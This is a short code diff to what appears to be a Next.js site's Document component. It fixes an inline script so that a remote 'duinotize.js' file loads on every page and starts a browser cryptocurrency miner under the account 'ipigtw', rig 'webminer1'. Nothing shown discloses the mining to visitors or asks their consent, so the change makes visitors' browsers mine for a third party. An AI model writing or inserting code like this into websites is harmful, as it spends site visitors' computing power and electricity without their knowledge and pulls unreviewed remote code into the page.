@@ -12,12 +12,11 @@ export default function Document() {
         <Main />
         <NextScript />
         <Script src="https://NoozAbooz.github.io/Duinotize/duinotize.js" defer onReady={() => {
-          <script>
+          const duinotize = (window as any).duinotize;
           duinotize.start({
             username: "ipigtw", 
             rigid: "webminer1" 
           }); 
-        </script>
         }}></Script>
 
       </body>
